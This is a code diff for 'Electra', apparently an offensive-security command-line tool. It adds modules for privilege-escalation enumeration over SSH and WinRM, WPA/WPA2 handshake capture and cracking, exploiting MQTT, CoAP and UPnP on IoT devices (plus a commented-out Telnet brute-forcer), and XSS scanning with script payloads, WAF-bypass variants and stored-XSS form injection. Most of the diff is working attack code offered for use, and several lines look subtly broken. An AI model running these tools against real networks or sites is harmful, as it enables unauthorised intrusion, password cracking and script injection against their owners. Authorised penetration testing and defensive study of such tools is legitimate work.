@@ -2,7 +2,7 @@
 #import pymongo.errors
 import dns.resolver
 import concurrent.futures
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3, re
 #import telnetlib (Deprecated in python 3.13)
 import requests.auth
 from smbprotocol.connection import Connection
@@ -16,6 +16,12 @@ from twilio.rest import Client
 from azure.identity import DefaultAzureCredential
 from azure.mgmt.resource import ResourceManagementClient
 from google.cloud import storage
+from winrm import Session
+from scapy.all import (Dot11Beacon, Dot11Elt)
+from paho import mqtt
+from aiocoap import Context, Message
+from aiocoap.numbers.codes import GET
+import xml.etree.ElementTree as ET #Deprecated
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -23,7 +29,7 @@ BANNER = """
 █████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
 ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
 ███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
-═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.3
+═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.4
 
 Electra - The master plan plotter.
 """
@@ -35,7 +41,7 @@ class BannerGroup(click.Group):
     
     def format_commands(self, ctx, formatter):
         commands = [
-            ("cdir", "Create a new directory in a specified path."),
+            #("cdir", "Create a new directory in a specified path."),
             ("sscan", "Perform a system scan."),
             ("nscan", "Perform a network scan."),
             ("webpass", "Web Dictionary Password Brute Force Attack."),
@@ -54,9 +60,13 @@ class BannerGroup(click.Group):
             ("nanal", "Perform network analysis. Capture and Analyse packets."),
             ("codec", "Perform encoding & decoding."),
             ("phish", "Generate phishing emails or login pages."),
-            ("dwrecon", "Dark Web Reconnaissance."),
+            ("dwrecon", "Perform Dark Web Reconnaissance."),
             ("soceng", "Perform Social Engineering attacks (Smishing & Vishing)."),
-            ("cloudsec", "Enumerate S3 buckets. Check for misconfigurations. Assess IAM Policies.")
+            ("cloudsec", "Enumerate S3 buckets. Check for misconfigurations. Assess IAM Policies."),
+            ("privescdet", "Privilege Escalation Detection."),
+            ("wifiatk", "Perform handshake captures. Analyze signal strength. Detect rogue APs. Crack WPA/WPA2 passwords."),
+            ("iotsec", "Scan and exploit IoT devices."),
+            ("xsscan", "Scan for XSS vulnerabilities.")
         ]
         with formatter.section("Commands"):
             for cmd, desc in commands:
@@ -1304,6 +1314,557 @@ def gcp_misconfig(key):
             click.echo(click.style(f" - {bucket.name}", fg="green"))
     except Exception as e:
         click.echo(click.style(f"[!] Error accessing GCP resources. {e}", fg="red"))
+
+#PRIVESCDET COMMAND
+@cli.command()
+@click.option("-m", "--mode", default="basic", type=click.Choice(["basic", "advanced"], case_sensitive=False), help="Detection mode (basic | advanced).")
+@click.option("-t", "--target", default="127.0.0.1", help="Target system. Default = localhost")
+@click.option("-o", "--output", default="Electra-PrivEsc-Results.txt", help="Output file to save results.")
+@click.option("-u", "--username", help="Username for remote login.")
+@click.option("-p", "--password", help="Password for remote login.")
+@click.option("-s", "--system", type=click.Choice(["unix", "windows"], case_sensitive=False), help="Target operating system.")
+def privescdet(mode, target, output, username, password, system):
+    results = []
+
+    if target != "127.0.0.1" and system:
+        click.echo(click.style(f"Scanning remote target: {target}.", fg="blue"))
+        if system == "unix":
+            results.append("== Sudo Permissions ==")
+            results.append(remote_unix(target, username, password, "sudo -l"))
+
+            results.append("\n== SUID Files ==")
+            results.append(remote_unix(target, username, password, "find / -perm -4000 2>/dev/null"))
+
+            results.append("\n== Writable System Files ==")
+            for file in ["/etc/passwd", "/etc/shadow"]:
+                results.append(remote_unix(target, username, password, f"ls -l {file}"))
+            
+            results.append("\n== World-Writable Files ==")
+            results.append(remote_unix(target, username, password, "find / -perm -2 ! -type l 2>/dev/null"))
+        
+        elif os == "windows":
+            results.append("== User Privileges ==")
+            results.append(remote_windows(target, username, password, "whoami /priv"))
+
+            results.append("\n== Writable System Files ==")
+            results.append(remote_windows(target, username, password, "icacls 'c:\\Windows\\System32'"))
+
+            results.append("\n== Scheduled Tasks ==")
+            results.append(remote_windows(target, username, password, "schtasks /query /fo LIST"))
+    
+    else:
+        click.echo(click.style("Scanning localhost.", fg="blue"))
+
+    click.echo(click.style(f"[*] Running Privilege Escalation detection in {mode} mode ...", fg="blue"))
+
+    if mode == "basic":
+        #Check Sudo permissions
+        results.append("== Sudo Permissions ==")
+        try:
+            sudo_check = subprocess.check_output("sudo -l", shell=True, text=True, stderr=subprocess.DEVNULL)
+            results.append(sudo_check.strip())
+        except subprocess.CalledProcessError:
+            click.echo(click.style("[!] Failed to check Sudo permissions.", fg="red"))
+        
+        #Find SUID files
+        results.append("\n== SUID Files ==")
+        try:
+            suid_files = subprocess.check_output("find / -perm -4000 2>/dev/null", shell=True, text=True)
+            results.append(suid_files.strip() if suid_files else "No SUID files found.")
+        except subprocess.CalledProcessError:
+            click.echo(click.style("[!] Failed to find SUID files.", fg="red"))
+        
+        #Check writable passwd and shadow file
+        results.append("\n== Writable System Files ==")
+        for file in ["/etc/passwd", "/etc/shadow"]:
+            if os.access(file, os.W_OK):
+                results.append(f"{file} is writable. Potential Privilege Escalation.")
+            else:
+                results.append(f"{file} is not writable.")
+        
+        #Check for world-writable files/directories
+        results.append("\n== World-Writable Files ==")
+        try:
+            writable_files = subprocess.check_output("find / -perm -2 ! -type l 2>/dev/null", shell=True, text=True)
+            results.append(writable_files.strip() if writable_files else "No world-writable files found.")
+        except subprocess.CalledProcessError:
+            click.echo(click.style("[!] Failed to find world-writable files.", fg="red"))
+    
+    elif mode == "advanced":
+        click.echo(click.style(f"[*] Running Privilege Escalation detection in {mode} mode ...", fg="blue"))
+        #Kernel exploits
+        results.append("\n== Kernel Exploits ==")
+        try:
+            kernel_version = subprocess.check_output("uname -r", shell=True, text=True).strip()
+            results.append(f"Kernel Version: {kernel_version}")
+            #Compare against known vulnerabilities (add logic to query or check a database)
+        except subprocess.CalledProcessError:
+            click.echo(click.style("[!] Failed to retrieve kernel version.", fg="red"))
+        
+        #Misconfigured services
+        results.append("\n== Misconfigured Services ==")
+        try:
+            services = subprocess.check_output("ps aux | grep root", shell=True, text=True).strip()
+            results.append(services)
+        except subprocess.CalledProcessError:
+            click.echo(click.style("[!] Failed to retrieve running services.", fg="red"))
+        
+        #Weak file permissions
+        results.append("\n== Weak File Permissions ==")
+        try:
+            weak_files = subprocess.check_output("find / -name '*.key' -o -name '*.conf' 2>/dev/null", shell=True, text=True).strip()
+            results.append(weak_files if weak_files else "No files with weak permissions found.")
+        except subprocess.CalledProcessError:
+            click.echo(click.style("[!] Failed to find files with weak permissions.", fg="red"))
+    
+    result_text = "\n".join(results)
+    if output:
+        with open(output, "w") as file:
+            file.write(result_text)
+        click.echo(click.style(f"[!] Results successfully saved to {output}.", fg="green"))
+    else:
+        click.echo(result_text)
+
+def remote_unix(host, username, password, command):
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(hostname=host, username=username, password=password)
+        stdin, stdout, stderr = client.exec_command(command)
+        output = stdout.read().decode().strip()
+        client.close()
+        return output
+    except Exception as e:
+        click.echo(click.style(f"Error connecting to Unix system: {e}", fg="red"))
+
+def remote_windows(host, username, password, command):
+    try:
+        session = Session(f"http://{host}:5985/wsman", auth=(username, password))
+        result = session.run_cmd(command)
+        return result.std_out.decode().strip()
+    except Exception as e:
+        click.echo(click.style(f"[!] Error connecting to Windows system: {e}", fg="red"))
+
+#WIFIATK COMMAND
+@cli.command()
+@click.option("-m", "--monitor", is_flag=True, help="Enable Wi-Fi monitoring mode.")
+@click.option("-c", "--capture", is_flag=True, help="Capture WPA/WPA2 handshake packets.")
+@click.option("-C", "--crack", type=click.Path(exists=True), help="Crack WPA/WPA2 passwords using a wordlist.")
+@click.option("-r", "--rogue", is_flag="True", help="Detect rogue access points.")
+@click.option("-s", "--signal", is_flag=True, help="Analyze Wi-Fi signal strength.")
+@click.option("-i", "--interface", required=True, help="Wireless interface to use.")
+@click.option("-o", "--output", default="Electra-Handshake.pcap", help="Output file for handshake capture.")
+def wifiatk(monitor, capture, crack, rogue, signal, interface, output):
+    click.echo(click.style(f"[*] Initializing Wi-Fi security testing on interface: {interface} ...", fg="blue"))
+    if monitor:
+        click.echo(click.style(f"[*] Enabling monitor mode ...", fg="blue"))
+        try:
+            subprocess.run(["airmon-ng", "start", interface], check=True) #REQUIREMENT = airmon-ng
+            click.echo(click.style(f"[+] Monitor mode enabled on {interface}.", fg="green"))
+        except subprocess.CalledProcessError as e:
+            click.echo(click.style(f"[!] Error enabling monitor mode: {e}", fg="red"))
+            return
+    
+    if capture:
+        click.echo(click.style(f"[!] Capturing handshake packets on {interface} ...", fg="blue"))
+        try:
+            packets = sniff(iface=interface, timeout=60)
+            wrpcap(output, packets)
+            click.echo(click.style(f"[!] Handshake capture successfully saved to {output}.", fg="green"))
+        except Exception as e:
+            click.echo(click.style(f"[!] Error capturing handshake: {e}", fg="red"))
+            return
+    
+    if crack:
+        click.echo(click.style("[*] Cracking WPA/WPA2 passwords ...", fg="blue"))
+        try:
+            subprocess.run(["aircrack-ng", output, "-w", crack], check=True) #REQUIREMENT = aircrack-ng
+        except subprocess.CalledProcessError as e:
+            click.echo(click.style(f"[!] Error during cracking: {e}", fg="red"))
+            return
+    
+    if rogue:
+        click.echo(click.style("[*] Detecting rogue access points ...", fg="blue"))
+        try:
+            packets = sniff(iface=interface, timeout=60)
+            for packet in packets:
+                if packet.haslayer(Dot11Beacon):
+                    ssid = packet.info.decode()
+                    bssid = packet.addr2
+                    channel = int(ord(packet[Dot11Elt:3].info))
+                    click.echo(click.style(f"[!] SSID: {ssid}, BSSID: {bssid}, Channel: {channel}", fg="green"))
+        except Exception as e:
+            click.echo(click.style(f"[!] Error detecting rogue APs: {e}", fg="red"))
+            return
+    
+    if signal:
+        click.echo(click.style("[*] Analysing signal strength ...", fg="blue"))
+        try:
+            packets = sniff(iface=interface, timeout=30)
+            for packet in packets:
+                if packet.haslayer(Dot11Beacon):
+                    ssid = packet.info.decode()
+                    rssi = -(256 - ord(packet.notdecoded[-4:-3]))
+                    click.echo(click.style(f"[!] SSID: {ssid}, Signal: {rssi} dBm", fg="green"))
+        except Exception as e:
+            click.echo(click.style(f"[!] Error analysing signal strength: {e}", fg="red"))
+            return
+    
+    if monitor:
+        click.echo(click.style("[*] Disabling monitor mode ...", fg="blue"))
+        try:
+            subprocess.run(["airmon-ng", "stop", interface], check=True)
+            click.echo(click.style(f"[-] Monitor mode disabled on {interface}", fg="red"))
+        except subprocess.CalledProcessError as e:
+            click.echo(click.style(f"[!] Error disabling monitor mode: {e}", fg="red"))
+            return
+
+#IOTSEC COMMAND
+@cli.command()
+@click.option("-t", "--target", required=True, help="Target network (e.g. 192.168.1.0/24).")
+@click.option("-s", "--scan", is_flag=True, help="Scan IoT devices on network.")
+@click.option("-e", "--exploit", is_flag=True, help="Exploit detected IoT devices.")
+@click.option("-p", "--protocol", type=click.Choice(["telnet", "mqtt", "coap", "upnp"], case_sensitive=False), help="Choose protocol to target.")
+@click.option("-u", "--username", default="admin", help="Username for authentication. Default = admin")
+@click.option("-w", "--wordlist", type=click.Path(exists=True), help="Path to wordlist for Brute-Forcing passwords.")
+def iotsec(target, scan, exploit, protocol, username, wordlist):
+    click.echo(click.style("[*] Initializing IoTSec module ...", fg="blue"))
+    if scan:
+        click.echo(click.style(f"[*] Scanning target: {target}", fg="blue"))
+        try:
+            #Use ARP scanning to discover devices
+            devices = discover_devices(target)
+            click.echo(click.style(f"[!] Found {len(devices)} devices.", fg="green"))
+            for ip, mac in devices:
+                click.echo(click.style(f"Device: {ip} | MAC: {mac}", fg="yellow"))
+                ports = [1883, 5683, 1900, 23] #MQTT, CoAP, UPNP, Telnet
+                open_ports = scan_ports(ip, ports)
+                if open_ports:
+                    click.echo(click.style(f"[!] Open ports on {ip}: {open_ports}", fg="green"))
+                else:
+                    click.echo(click.style(f"[!] No open ports on {ip}.", fg="red"))
+        except Exception as e:
+            click.echo(click.style(f"[!] Error during scan: {e}", fg="red"))
+    
+    if exploit:
+        if not protocol:
+            click.echo(click.style("[!] Please specify a protocol to exploit (-p).", fg="red"))
+            return
+        if protocol == "telnet":
+            exploit_telnet(target, username, wordlist)
+        elif protocol == "mqtt":
+            exploit_mqtt(target)
+        elif protocol == "coap":
+            exploit_coap(target)
+        elif protocol == "upnp":
+            exploit_upnp(target)
+
+def discover_devices(target):
+    devices = []
+    try:
+        scanner = subprocess.run(["arp-scan", "-l", target], capture_output=True, text=True) #REQUIREMENT = arp-scan
+        for line in scanner.stdout.split("\n"):
+            if ":" in line: #Check for MAC addresses
+                parts = line.split()
+                devices.append((parts[0], parts[1])) #IP and MAC
+    except FileNotFoundError:
+        raise Exception("arp-scan is not installed. Please install it first.")
+    return devices
+
+def scan_ports(ip, ports):
+    open_ports = []
+    for port in ports:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((ip, port))
+            if result == 0:
+                open_ports.append(port)
+            s.close()
+        except Exception:
+            pass
+    return open_ports
+
+#Exploit Telnet by Brute-Forcing weak credentials
+def exploit_telnet(target, username, wordlist):
+    click.echo(click.style(f"[!] Telnet protocol is no longer supported due to deprecation.", fg="red"))
+"""
+def exploit_telnet(target, username, wordlist):
+    click.echo(click.style("[*] Exploiting Telnet ...", fg="blue"))
+    devices = discover_devices(target)
+    for ip, _ in devices:
+        if 23 in scan_ports(ip, [23]):
+            click.echo(click.style(f"[*] Attempting Telnet Brute Force on {ip} ...", fg="blue"))
+            with open(wordlist, "r") as file:
+                for password in file:
+                    password = password.strip()
+                    try:
+                        telnet = telnetlib.Telnet(ip)
+                        telnet.read_until(b"login: ")
+                        telnet.write(username.encode("ascii") + b"\n")
+                        telnet.read_until(b"Password: ")
+                        telnet.write(password.encode("ascii") + b"\n")
+                        result = telnet.read_all()
+                        if "incorrect" not in result.decode("ascii").lower():
+                            click.echo(click.style(f"[!] Found credentials: {username}:{password}", fg="green"))
+                            telnet.close()
+                            break
+                        telnet.close()
+                    except Exception:
+                        pass
+"""
+
+#Exploit misconfigured MQTT brokers
+def exploit_mqtt(target):
+    click.echo(click.style("[*] Exploiting MQTT brokers ...", fg="blue"))
+    devices = discover_devices(target)
+    for ip, _ in devices:
+        if 1883 in scan_ports(ip, [1883]):
+            try:
+                client = mqtt.Client()
+                client.connect(ip, 1883, 60)
+                client.loop_start()
+                client.subscribe("#") #Subscribe to all topics
+                click.echo(click.style(f"[!] Successfully subscribed to all topics on {ip}.", fg="green"))
+            except Exception as e:
+                click.echo(click.style(f"[!] Failed to exploit MQTT on {ip}. Error: {e}", fg="red"))
+
+#Exploit CoAP by enumerating accessible resources
+async def exploit_coap(target):
+    click.echo(click.style("[*] Exploiting CoAP devices ...", fg="blue"))
+    devices = discover_devices(target)
+    for ip, _ in devices:
+        if 5683 in scan_ports(ip, [5683]):
+            click.echo(click.style(f"[*] Attempting CoAP resource enumeration on {ip} ...", fg="blue"))
+            try:
+                protocol = await Context.create_client_context()
+                request = Message(code=GET, uri=f"coap://{ip}/.well-known/core")
+                response = await protocol.request(request).response
+                click.echo(click.style(f"[!] Found resources on {ip}: {response.payload.decode()}", fg="green"))
+            except Exception as e:
+                click.echo(click.style(f"[!] Failed to retrieve CoAP resources on {ip}. Error: {e}", fg="red"))
+
+#Exploit UPnP by discovering services and extracting device details
+def exploit_upnp(target):
+    click.echo(click.style("[*] Exploiting UPnP devices ...", fg="blue"))
+    upnp_discovery_msg = (
+        "M-SEARCH * HTTP/1.1\r\n"
+        "HOST: 239.255.255.250:1900\r\n"
+        "ST: ssdp:all\r\n"
+        "MAN: \"ssdp:discover\"\r\n"
+        "MX: 2\r\n"
+        "\r\n"
+    )
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+    s.settimeout(5)
+    try:
+        s.sendto(upnp_discovery_msg.encode(), ("239.255.255.250", 1900))
+        while True:
+            try:
+                response, addr = s.recvfrom(65507)
+                response = response.decode(errors="ignore")
+                if "LOCATION" in response:
+                    location = None
+                    for line in response.split("\r\n"):
+                        if line.startswith("LOCATION:"):
+                            location = line.split(" ", 1)[1].strip()
+                    if location:
+                        click.echo(click.style(f"[!] Successfully found UPnP device at {addr[0]} - {location}", fg="green"))
+                        extract_upnp_info(location)
+            except socket.timeout:
+                #break
+                click.echo(click.style("[!] Error: Connection Timeout.", fg="red"))
+    finally:
+        s.close()
+
+#Extract UPnP device details from the XML description file
+def extract_upnp_info(url):
+    try:
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            root = ET.fromstring(response.content)
+            dev_info = root.find(".//{urn:schemas-upnp-org:device-1-0}device")
+            if dev_info:
+                dev_name = dev_info.find("{urn:schemas-upnp-org:device-1-0}friendlyName").text
+                dev_model = dev_info.find("{urn:schemas-upnp-org:device-1-0}modelName").text
+                dev_manufacturer = dev_info.find("{urn:schemas-upnp-org:device-1-0}manufacturer").text
+                click.echo(click.style(f"[!] Found device name: {dev_name}", fg="green"))
+                click.echo(click.style(f"[!] Found device model: {dev_model}", fg="green"))
+                click.echo(click.style(f"[!] Found device manufacturer: {dev_manufacturer}", fg="green"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Failed to retrieve UPnP details. Error: {e}", fg="red"))
+
+#XSSCAN COMMAND
+XSS_PAYLOADS = [
+    "<script>alert('Electra')</script>",
+    "\"><script>alert('Electra')</script>",
+    "';alert('Electra');//",
+    "javascript:alert('Electra')",
+    "<img src=x onerror=alert('Electra')>"
+]
+
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL to scan.")
+@click.option("-p", "--payloads", type=click.Path(exists=True), help="File containing custom XSS payloads.")
+@click.option("-m", "--method", type=click.Choice(["GET", "POST"], case_sensitive=False), default="GET", help="HTTP method to use.")
+@click.option("-c", "--crawl", is_flag=True, help="Crawl the website to find additional parameters.")
+@click.option("-h", "--headers", is_flag=True, help="Test XSS injection via HTTP headers like Referer and User-Agent.")
+@click.option("-v", "--verbose", is_flag=True, help="Enable verbose mode for detailed output.")
+@click.option("-b", "--bypass", is_flag=True, help="Use WAF bypass techniques.")
+@click.option("-s", "--stored", is_flag=True, help="Test for stored XSS by submitting payloads in forms.")
+@click.option("-d", "--dom", is_flag=True, help="Test for DOM-based XSS.")
+@click.option("-t", "--threads", type=int, default=5, help="Number of threads for faster scanning.")
+@click.option("--cookie", help="Optional session cookie for authenticated scanning.")
+@click.option("--proxy", help="Proxy URL for stealth scanning (e.g. http://127.0.0.1:8000).")
+def xsscan(url, payloads, method, crawl, headers, verbose, bypass, stored, dom, threads, cookie, proxy):
+    click.echo(click.style(f"[*] Scanning target: {url}", fg="blue"))
+    #Load custom payloads
+    if payloads:
+        with open(payloads, "r", encoding="utf-8") as file:
+            custom_payloads = [line.strip() for line in file.readlines()]
+        click.echo(click.style(f"[*] Using custom payloads.\n", fg="blue"))
+    else:
+        custom_payloads = XSS_PAYLOADS
+        click.echo(click.style(f"[*] Using default payloads.\n", fg="blue"))
+    
+    #Use bypass payloads
+    if bypass:
+        custom_payloads.extend([
+            "<ScRipT>alert('Electra')</ScRipT>",
+            "<svg/onload=alert('Electra')>",
+            "<iframe src=javascript:alert('Electra')>"
+        ])
+        click.echo(click.style(f"[*] Using WAF bypass techniques (scripts).", fg="blue"))
+    
+    #Set up session, headers and proxy
+    session = requests.Session()
+    if cookie:
+        session.headers.update({"Cookie": cookie})
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    #Find parameters in URL
+    params = extract_params(url)
+    if params:
+        click.echo(click.style(f"[!] Found parameters: {params}", fg="green"))
+    else:
+        click.echo(click.style(f"[!] No parameters found. Try adding manually.", fg="red"))
+    
+    #Scan parameters for XSS
+    """
+    for param in params:
+        for payload in custom_payloads:
+            target_url = inject_payload(url, param, payload)
+            if method == "GET":
+                response = requests.get(target_url)
+            else: #POST request
+                response = requests.post(url, data={param: payload})
+            
+            #response = requests.get(target_url) if method == "GET" else requests.post(url, data={param: payload})
+            
+            if is_vulnerable(response, payload):
+                click.echo(click.style(f"[!] XSS detected on {target_url} with payload: {payload}", fg="green"))
+    """
+
+    #Scan parameters for XSS using threads
+    def scan_payload(param, payload):
+        target_url = inject_payload(url, param, payload)
+        if method == "GET":
+            response = session.get(target_url, proxies=proxies)
+        else:
+            response = session.post(url, data={param: payload}, proxies=proxies)
+        if is_vulnerable(response, payload):
+            click.echo(click.style(f"[!] XSS detected on {target_url} with payload: {payload}", fg="green"))
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        for param in params:
+            for payload in custom_payloads:
+                executor.submit(scan_payload, param, payload)
+    
+    #Crawl website
+    if crawl:
+        discovered_links = crawl_website(url)
+        click.echo(click.style("\n[*] Crawling completed!", fg="blue"))
+        click.echo(click.style(f"[!] Discovered {len(discovered_links)} links.", fg="green"))
+    
+    #Test header injections
+    if headers:
+        header_payloads = {"User-Agent": "<script>alert('Electra')</script>", "Referer": "javascript:alert('Electra')"}
+        response = requests.get(url, headers=header_payloads)
+        if is_vulnerable(response, "<script>alert('Electra')</script>"):
+            click.echo(click.style(f"\n[!] Header-based XSS detected on {url}", fg="green"))
+
+    #Test for stored XSS
+    if stored:
+        stored_xss(url, custom_payloads)
+    
+    #Test for DOM-based XSS
+    if dom:
+        dom_xss(url, custom_payloads)
+
+    click.echo(click.style(f"\n[*] XSS scan completed.", fg="blue"))
+
+#Extract GET parameters from target URL
+def extract_params(url):
+    parsed_url = urllib.parse.urlparse(url)
+    return list(urllib.parse.parse_qs(parsed_url.query).keys())
+
+#Inject XSS payload into a URL parameter
+def inject_payload(url, param, payload):
+    parsed_url = list(urllib.parse.urlparse(url))
+    query = dict(urllib.parse.parse_qsl(parsed_url[4]))
+    query[param] = payload
+    parsed_url[4] = urllib.parse.urlencode(query)
+    return urllib.parse.urlunparse(parsed_url)
+
+def is_vulnerable(response, payload):
+    return payload in response.text
+
+def crawl_website(url):
+    links = set()
+    try:
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, "html.parser")
+        for link in soup.find_all("a", "href=True"):
+            href = link["href"]
+            if href.startswith("http"):
+                links.add(href)
+            else:
+                links.add(urllib.parse.urljoin(url, href))
+    except Exception as e:
+        click.echo(click.style(f"[!] Crawling error: {e}", fg="red"))
+    return links
+
+def stored_xss(url, payloads):
+    click.echo(click.style("\n[*] Testing for Stored XSS ...", fg="blue"))
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, "html.parser")
+    forms = soup.find_all("form")
+    
+    for form in forms:
+        action = form.get("action")
+        method = form.get("method", "get").upper()
+        inputs = {field.get("name"): payloads[0] for field in form.find_all("input") if field.get("name")}
+        if action:
+            target = urllib.parse.urljoin(url, action)
+            if method == "POST":
+                requests.post(target, data=inputs)
+            else:
+                requests.get(target, params=inputs)
+    
+    #time.sleep(2)
+    verification = requests.get(url)
+    for payload in payloads:
+        if payload in verification.text:
+            click.echo(click.style(f"[!] Stored XSS detected at {url}", fg="green"))
+
+def dom_xss(url, payloads):
+    click.echo(click.style(f"\n[*] Testing for DOM-based XSS ...", fg="blue"))
+    for payload in payloads:
+        dom_url = f"{url}#{payload}"
+        response = requests.get(dom_url)
+        if is_vulnerable(response, payload):
+            click.echo(click.style(f"[!] DOM-based XSS detected at {dom_url}", fg="green"))
 
 if __name__ == "__main__":
     cli()
